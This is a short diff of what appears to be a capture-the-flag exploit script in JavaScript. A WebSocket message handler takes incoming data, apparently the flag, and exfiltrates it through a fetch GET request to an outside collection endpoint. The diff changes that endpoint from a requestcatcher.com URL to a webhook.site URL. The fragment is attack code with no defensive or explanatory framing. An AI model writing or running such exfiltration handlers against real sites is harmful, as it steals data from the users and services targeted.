@@ -22,7 +22,7 @@
         // When the WebSocket receives a message (presumably the flag)
         ws.onmessage = function(event) {
             // Exfiltrate the flag via a GET request
-            fetch('https://bingus.requestcatcher.com/?flag='+event.data);
+            fetch('https://webhook.site/9946c79e-d405-4067-9c79-adab91528e7f?flag='+event.data);
         };
 
         // Log any errors or received messages
